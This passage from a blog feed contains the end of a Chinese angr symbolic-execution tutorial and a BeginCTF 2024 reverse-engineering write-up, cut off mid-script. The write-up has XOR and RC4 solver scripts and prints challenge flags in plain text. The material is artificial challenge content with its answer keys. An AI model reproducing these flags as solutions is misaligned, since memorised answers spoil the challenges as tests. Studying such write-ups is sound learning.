class="line">state = p.factory.entry_state()</span><br></pre></td></tr></table></figure><p>预设状态有四种方式如下：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233150939.png" alt="image-20240216233150939"></p><p>状态包含了程序运行时的一切信息，寄存器、内存的值、文件系统以及<strong>符号变量</strong>等，这些信息的使用等</p><p>用到时再进一步说明。</p><p>entry_state 和 blank_state 是常用的两种方式，后者通常用于跳过一些极大降低 angr 效率的指令，它</p><p>们间的对比如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; state = p.factory.entry_state()</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 <span class="number">0</span>x1c&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br><span class="line">&gt;&gt;&gt; state = p.factory.blank_state(addr=<span class="number">0</span>x4023c0)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 reg_rax_42_64&#123;UNINITIALIZED&#125;&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br></pre></td></tr></table></figure><p>在 blank_state 方式中，我们仍将地址设定为程序的入口点，然而 rax 中的值由于没有初始化，它现在</p><p>是一个名字，也即符号变量，这是符号执行的基础。此外，可以看到寄存器中的数据类型并不是 int，</p><p>而是 BV64，它是一个位向量（Bit Vector）。</p><h3 id="Simulation-Manager"><a href="#Simulation-Manager" class="headerlink" title="Simulation Manager"></a><strong>Simulation Manager</strong></h3><p>上述方式只是预设了程序开始分析时的状态，我们要分析程序就必须要让它到达下一个状态，这就需要</p><p>模拟管理器的帮助（简称 SM）。</p><p>使用以下指令能创建一个 SM，它需要传入一个 state 或者 state 的列表作为参数：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233228867.png" alt="image-20240216233228867"></p><p>默认情况下，state 会被存放在 active 中。</p><p>可以通过 step() 方法来让处于 active 的 state 执行一个基本块，这种操作不会改变 state 本身（类比</p><p>docker）：<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233245331.png" alt="image-20240216233245331"></p><h3 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a><strong>Explorer</strong></h3><p>可以使用 explorer 方法去执行某个状态，直到找到目标指令或者 active 中没有状态为止，它有如下参</p><p>数：</p><p>find：传入目标指令的地址或地址列表，或者一个用于判断的函数</p><p>avoid：传入要避免的指令的地址或地址列表，或者一个用于判断的函数，用于减少路径</p><p>angr 会沿着分支按照某种策略（默认DFS）进行状态搜索，当达到目标状态时，使用约束求解器</p><p>（claripy）对收集到的约束进行求解。</p><p>因此，使用 angr 一般分为如下步骤：</p><p>\1. 创建 Project，预设 state</p><p>\2. 创建位向量和符号变量，保存在内存&#x2F;寄存器&#x2F;文件或其他地方</p><p>\3. 将 state 添加到 SM 中</p><p>\4. 运行，探索满足条件的路径</p><p>\5. 约束求解获取执行结果</p><h2 id="angr-入门练习"><a href="#angr-入门练习" class="headerlink" title="angr 入门练习"></a><strong>angr</strong> <strong>入门练习</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_aut0m4t3_0r_4r3_y0u_h4rdw0rk1ng_?&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_aut0m4t3_0r_4r3_y0u_h4rdw0rk1ng_?&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;符号执行框架&quot;&gt;&lt;a href=&quot;#符号执行框架&quot; class=&quot;headerlink&quot; title=&quot;符号执行框架&quot;&gt;&lt;/a&gt;符号执行框架&lt;/h1&gt;&lt;h2 id=&quot;符号执行介绍&quot;&gt;&lt;a href=&quot;#符号执行介绍&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>BeginCTF 2024冬</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/BeginCTF2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/BeginCTF2024/</id>
    <published>2024-02-08T16:00:00.000Z</published>
    <updated>2024-02-23T14:34:13.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BeginCTF-2024冬"><a href="#BeginCTF-2024冬" class="headerlink" title="BeginCTF 2024冬"></a>BeginCTF 2024冬</h1><p>写的题不多，从师傅们写的特别好的wp们学到了很多，</p><p>以下是学习复现后的一些笔记</p><p>参考了很多师傅的文章：</p><p><a href="https://hjug69b9j6.feishu.cn/docx/V02Rd3MyWoRPVxxTTCOcLutNnqe">官方wp</a></p><p><a href="http://t.csdnimg.cn/jCdia">直接写了很多不会的题的题解</a></p><p><a href="https://www.hbailu.top/index.php/archives/131">这哥们思路图非常好，借鉴</a></p><p><a href="https://yurogod.github.io/ctf/events/BeginCTF-2024/">除密码的全能师傅</a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p><a href="https://hw6vk9v66q.feishu.cn/docx/UIm5dwwbzo4O6IxALeZcpXdCnDh">题目附件</a></p><h3 id="real-checkin-xor"><a href="#real-checkin-xor" class="headerlink" title="real checkin xor"></a><strong>real checkin xor</strong></h3><p>这道题是，因为签到逆向题有点难，出题师傅又出的真真签到题，确实不难。</p><p>直接给的就是代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_func</span>(<span class="params">ciper,key</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciper)):</span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(ciper[i])^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line">secret = [<span class="number">7</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">91</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">39</span>, <span class="number">45</span>, <span class="number">23</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">24</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;这是一个保险箱,你能输入相关的key来进行解密吗?&quot;</span>)</span><br><span class="line">input_line = <span class="built_in">input</span>(<span class="string">&quot;请输入key &gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> verify_func(input_line,<span class="string">&quot;ez_python_xor_reverse&quot;</span>) == secret:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码正确&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码错误&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206205429012.png" alt="image-20240206205429012"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> a[<span class="number">100</span>]=&#123; <span class="number">7</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">91</span>, <span class="number">21</span>, </span><br><span class="line"><span class="number">49</span>, <span class="number">15</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">36</span>, </span><br><span class="line"><span class="number">64</span>, <span class="number">23</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">38</span>, </span><br><span class="line"><span class="number">108</span>, <span class="number">39</span>, <span class="number">45</span>, <span class="number">23</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">24</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> key[<span class="number">100</span>]=&#123;<span class="string">&quot;ez_python_xor_reverse&quot;</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]^key[i%<span class="built_in">strlen</span>(key)]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//begin&#123;3z_PY7hoN_r3V3rSE_For_TH3_Be9inNEr!&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_func</span>(<span class="params">encrypted, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)):</span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(encrypted[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;ez_python_xor_reverse&quot;</span></span><br><span class="line">ciper = [<span class="number">7</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">91</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">39</span>, <span class="number">45</span>, <span class="number">23</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">decrypted_text = decrypt_func(ciper, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure><h3 id="红白机"><a href="#红白机" class="headerlink" title="红白机"></a>红白机</h3><p>要注意下载的文件名呜呜</p><p><a href="https://wusiyu.me/6502-cpu%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%8C%87%E4%BB%A4%E9%9B%86/#zhi_ling_ji">指令集</a></p><h4 id="6502汇编码-直接编译运行"><a href="#6502汇编码-直接编译运行" class="headerlink" title="# 6502汇编码   直接编译运行"></a># 6502汇编码   直接编译运行</h4><p><a href="https://codediy.github.io/nes-zh/easy6502/index.html">Easy 6502</a></p><h4 id="或者自己手搓"><a href="#或者自己手搓" class="headerlink" title="或者自己手搓"></a>或者自己手搓</h4><p>偏移为0x200，黑色地方提取画图</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">screen = [[<span class="number">0</span>] * <span class="number">32</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addr_to_coords</span>(<span class="params">addr</span>):</span><br><span class="line">    addr -= <span class="number">0x200</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">divmod</span>(addr, <span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>, <span class="number">0x600</span>, <span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>):</span><br><span class="line">        row, col = addr_to_coords(base + offset)</span><br><span class="line">        screen[row][col] = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">ops = [</span><br><span class="line">    (<span class="number">0x201</span>, <span class="number">0</span>), (<span class="number">0x202</span>, <span class="number">0</span>), (<span class="number">0x221</span>, <span class="number">0</span>), (<span class="number">0x240</span>, <span class="number">0</span>), (<span class="number">0x241</span>, <span class="number">0</span>), (<span class="number">0x242</span>, <span class="number">0</span>), (<span class="number">0x261</span>, <span class="number">0</span>), (<span class="number">0x281</span>, <span class="number">0</span>),</span><br><span class="line">    (<span class="number">0x204</span>, <span class="number">0</span>), (<span class="number">0x224</span>, <span class="number">0</span>), (<span class="number">0x244</span>, <span class="number">0</span>), (<span class="number">0x264</span>, <span class="number">0</span>), (<span class="number">0x284</span>, <span class="number">0</span>), (<span class="number">0x246</span>, <span class="number">0</span>), (<span class="number">0x247</span>, <span class="number">0</span>), (<span class="number">0x248</span>, <span class="number">0</span>),</span><br><span class="line">..........................</span><br><span class="line">..........................</span><br><span class="line"> </span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr, val <span class="keyword">in</span> ops:</span><br><span class="line">    row, col = addr_to_coords(addr)</span><br><span class="line">    screen[row][col] = val</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> screen:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="string">&#x27;   &#x27;</span> <span class="keyword">if</span> pixel <span class="keyword">else</span> <span class="string">&#x27; * &#x27;</span> <span class="keyword">for</span> pixel <span class="keyword">in</span> row))</span><br></pre></td></tr></table></figure><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a><strong>xor</strong></h3><p>upx壳+反调试</p><blockquote><p>rdata段：用于从远程服务器获取当前日期和时间的命令行实用程序，通常用于UNIX类操作系统以将系统时钟与远程时间服务器同步。</p></blockquote><h4 id="走弯路做法：分析加密原理，找静态资源"><a href="#走弯路做法：分析加密原理，找静态资源" class="headerlink" title="走弯路做法：分析加密原理，找静态资源"></a>走弯路做法：分析加密原理，找静态资源</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206224417017.png" alt="image-20240206224417017"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> dec3[<span class="number">33</span>];</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> dec4[] = <span class="string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>;</span><br><span class="line"><span class="type">char</span> key1[] = <span class="string">&quot;63290794207715587679621386735000&quot;</span>;</span><br><span class="line"><span class="type">char</span> key2[] = <span class="string">&quot;41803873625901363092606632787947&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">char</span> *output,<span class="type">char</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">char</span> dec1[<span class="number">33</span>];</span><br><span class="line">    <span class="type">char</span> dec2[<span class="number">33</span>];</span><br><span class="line">    <span class="type">char</span> key1[<span class="number">33</span>];</span><br><span class="line">    <span class="type">char</span> key2[<span class="number">33</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        key1[i] = key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        key2[i] = key[i + <span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;  </span><br><span class="line">        dec1[i] = output[i + <span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;  </span><br><span class="line">        dec2[i] = output[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec1[i] ^= key1[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec2[i] ^= key2[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        dec1[i] ^= key2[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec2[i] ^= key1[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec1[i] ^= key1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;  </span><br><span class="line">        dec2[i] ^= key2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec1[i] ^= key2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec2[i] ^= key1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        dec3[i] = dec1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        dec3[i + <span class="number">16</span>] = dec2[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    dec(dec4,key2);</span><br><span class="line">    dec(dec3,key1);</span><br><span class="line">    <span class="built_in">printf</span>(dec3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="简单粗暴法：异或是可逆的"><a href="#简单粗暴法：异或是可逆的" class="headerlink" title="简单粗暴法：异或是可逆的"></a>简单粗暴法：异或是可逆的</h4><p>但是得考虑反调试，要不然出不来，</p><h3 id="superguesser（动态调试"><a href="#superguesser（动态调试" class="headerlink" title="superguesser（动态调试"></a><strong>superguesser</strong>（动态调试</h3><h4 id="a-静态猜测！牛"><a href="#a-静态猜测！牛" class="headerlink" title="a?静态猜测！牛"></a>a?静态猜测！牛</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206235813820.png" alt="image-20240206235813820"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;5151525f59435d5f59495a59562e261d2a371a27291728242a3825213d0f323a3c3d36332a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i] ^ (i + <span class="number">51</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="俄语学习"><a href="#俄语学习" class="headerlink" title="俄语学习"></a>俄语学习</h3><p>IDA后发现答案都是明文，（但是好多题</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207224620727.png" alt="image-20240207224620727"></p><p>最后的求flag才是正菜</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207222416136.png" alt="image-20240207222416136"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207231022742.png" alt="image-20240207231022742"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207231040398.png" alt="image-20240207231040398"></p><p>flag输入后，内容是要去func2中的tmpStr（明文）比较的，所以需要运行并提取tmpStr加密前后的内容，还有两个盒子以及Str2_0</p><p>主要加密是rc4，而且str的加密结果和tmpStr的加密结果是相同的，间接的给出了str的结果</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208010234042.png" alt="image-20240208010234042"></p><h4 id="爆破rc4"><a href="#爆破rc4" class="headerlink" title="爆破rc4"></a>爆破rc4</h4><p>#硬写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box3[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box4[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个盒子 box</span></span><br><span class="line"><span class="type">unsigned</span> <span 